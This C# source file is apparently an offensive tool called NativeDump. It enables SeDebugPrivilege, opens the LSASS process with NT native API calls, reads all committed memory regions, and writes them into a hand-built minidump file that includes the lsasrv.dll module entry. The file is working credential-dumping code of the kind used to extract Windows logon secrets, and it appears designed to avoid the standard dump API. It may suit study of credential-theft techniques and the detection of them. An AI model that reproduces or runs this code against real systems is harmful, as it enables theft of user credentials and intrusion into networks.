using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using static NativeDump.Win32;


namespace NativeDump
{
    internal class Program
    {
        public static byte[] ToByteArray(String hexString)
        {
            // In case the string length is odd
            if (hexString.Length % 2 == 1)
            {
                Console.WriteLine("[-] Hexadecimal value length is odd, adding a 0.");
                hexString += "0";
            }
            byte[] retval = new byte[hexString.Length / 2];
            for (int i = 0; i < hexString.Length; i += 2)
                retval[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
            return retval;
        }


        public static string IntPtrToString(IntPtr intptr_val)
        {
            string hex_string = BitConverter.ToString(BitConverter.GetBytes(intptr_val.ToInt64())).Replace("-", "");
            return hex_string;

        }


        static void CreateMinidump(string M64Size_DataDirectory, string LsasrvDll_Address, List<Memory64Info> mem64info_List, byte[] aux_bytearray, string dumpfile)
        {
            string buff = "";
            // Header
            buff += "4D444D50"; // Signature
            buff += "93A7"; // Version
            buff += "0000";
            buff += "03000000"; // NumberOfStreams
            buff += "20000000"; // StreamDirectoryRVA
            buff += "00000000";
            buff += "0000000000000000";
            buff += "00000000";

            // Stream Directory
            buff += "04000000" + "70000000" + "7C000000";
            buff += "07000000" + "38000000" + "44000000";
            buff += "09000000" + M64Size_DataDirectory + "30010000"; // Address = 32 + 36 + 56 + 4 + 108 + 4 + 4 (+2)

            // SystemInfoStream
            string systeminfostream = "0900";
            systeminfostream += "0000";
            systeminfostream += "0000";
            systeminfostream += "00";
            systeminfostream += "00";
            systeminfostream += "0A000000"; // Major Version
            systeminfostream += "00000000";
            systeminfostream += "654a0000";
            systeminfostream += "00000000";
            systeminfostream += "00000000";
            systeminfostream += "00000000";
            systeminfostream += "0000000000000000";
            systeminfostream += "0000000000000000";
            systeminfostream += "00000000";
            systeminfostream += "00000000";
            buff += systeminfostream;
           
            // ModuleList
            string modulelist = "01000000";
            modulelist += LsasrvDll_Address; // "00000837FF7F0000";
            modulelist += "00301a00";
            modulelist += "0000000000000000";
            modulelist += "EC000000"; // 
            modulelist += "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"; // ¿80 o 84?
            modulelist += "00000000";
            buff += modulelist;
           
            // Unicode string
            string unicode_string = "3C000000";
            unicode_string += "43003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C006C00730061007300720076002E0064006C006C000000";
            unicode_string += "0000"; // Para pasar a 0x130, si no hay que ir a 0x12E
            buff += unicode_string;

            // Memory64List
            int number_of_entries = (int)mem64info_List.Count;
            int offset_mem_regions = 0x130 + 16 + (16 * number_of_entries);
            string mem64list = "";
            mem64list += IntPtrToString((IntPtr)number_of_entries);
            mem64list += IntPtrToString((IntPtr)offset_mem_regions);
            for (int i = 0; i < mem64info_List.Count; i++)
            {
                mem64list += IntPtrToString(mem64info_List[i].Address);
                mem64list += IntPtrToString(mem64info_List[i].Size);
            }
            buff += mem64list;

            byte[] buff_bytes = ToByteArray(buff);
            byte[] mergedArray = buff_bytes.Concat(aux_bytearray).ToArray();

            try
            {
                using (FileStream fs = new FileStream(dumpfile, FileMode.Create))
                {
                    fs.Write(mergedArray, 0, mergedArray.Length);
                }
                Console.WriteLine("[+] File " + dumpfile + " created.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] It was not possible to create the file. Exception message: " + ex.Message);
            }
        }


        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                // Obtiene el token de acceso del proceso actual
                int result = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (result != 0)
                {
                    throw new InvalidOperationException("Error al abrir el token de acceso.");
                }

                // Obtiene el LUID del privilegio SeDebugPrivilege
                LUID luid = new LUID();
                if (!LookupPrivilegeValue(null, SE_DEBUG_NAME, ref luid))
                {
                    throw new InvalidOperationException("Error al obtener el LUID del privilegio SeDebugPrivilege.");
                }

                // Habilita el privilegio SeDebugPrivilege en el token
                TOKEN_PRIVILEGES privileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Privileges = new LUID_AND_ATTRIBUTES[1]
                };
                privileges.Privileges[0].Luid = luid;
                privileges.Privileges[0].Attributes = 0x00000002;
                if (NtAdjustPrivilegesToken(tokenHandle, false, ref privileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero) != 0)
                {
                    throw new InvalidOperationException("Error al habilitar el privilegio SeDebugPrivilege.");
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        static IntPtr GetDllBaseAddress(IntPtr hProcess, string dll_name)
        {
            IntPtr[] modulos = new IntPtr[1024];
            uint numModulos;

            EnumProcessModulesEx(hProcess, modulos, modulos.Length * IntPtr.Size, out numModulos, 3);
            for (int i = 0; i < numModulos / IntPtr.Size; i++)
            {
                char[] moduleName = new char[1024];
                GetModuleBaseName(hProcess, modulos[i], moduleName, (uint)moduleName.Length);

                string moduleNameStr = new string(moduleName);

                if (moduleNameStr.ToLower().Contains(dll_name.ToLower()))
                {
                    IntPtr direccionBase = modulos[i];
                    return direccionBase;
                }
            }
            return IntPtr.Zero;
        }


        static void Main(string[] args)
        {
            // Get process name
            string procname = "lsass";
            
            //Get process PID
            Process[] process_list = Process.GetProcessesByName(procname);
            if (process_list.Length == 0)
            {
                Console.WriteLine("[-] Process " + procname + " not found.");
                Environment.Exit(0);
            }
            int processPID = process_list[0].Id;
            Console.WriteLine("[+] Process PID: " + processPID);

            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Get process handle with NtOpenProcess
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            Console.WriteLine("[+] Process handle: " + processHandle);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] NtOpenProcess failed. Do you have enough privileges for this process?");
                Environment.Exit(0);
            }

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr aux_address = IntPtr.Zero;
            byte[] aux_bytearray = { };
            List<Memory64Info> mem64info_List = new List<Memory64Info>();

            while ((long)aux_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)aux_address, MemoryBasicInformation, out mbi, 0x30, out _);

                // If readable and commited --> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    // Add to Memory64Info list
                    Memory64Info mem64info = new Memory64Info();
                    mem64info.Address = mbi.BaseAddress;
                    mem64info.Size = mbi.RegionSize;
                    mem64info_List.Add(mem64info);

                    // Dump memory
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    byte[] new_bytearray = new byte[aux_bytearray.Length + buffer.Length];
                    Buffer.BlockCopy(aux_bytearray, 0, new_bytearray, 0, aux_bytearray.Length);
                    Buffer.BlockCopy(buffer, 0, new_bytearray, aux_bytearray.Length, buffer.Length);
                    aux_bytearray = new_bytearray;
                    
                    //byte[] new_bytearray = aux_bytearray.Concat(buffer).ToArray();
                    //aux_bytearray = new_bytearray;
                }

                // Next memory region
                aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
            }

            // Get file name
            string dumpfile = "proc_" + processPID + ".dmp";
            if (args.Length > 0)
            {
                dumpfile = args[0];
            }

            // Generate Minidump file
            int m64size = 16 + 16 * mem64info_List.Count;
            string M64Size_DataDirectory = IntPtrToString((IntPtr)m64size).Substring(0, 8);
            IntPtr lsasrvdll_address = GetDllBaseAddress(processHandle, "lsasrv.dll");
            string LsasrvDll_Address = IntPtrToString(lsasrvdll_address);
            CreateMinidump(M64Size_DataDirectory, LsasrvDll_Address, mem64info_List, aux_bytearray, dumpfile);

            // Close process handle
            NtClose(processHandle);
        }
    }
}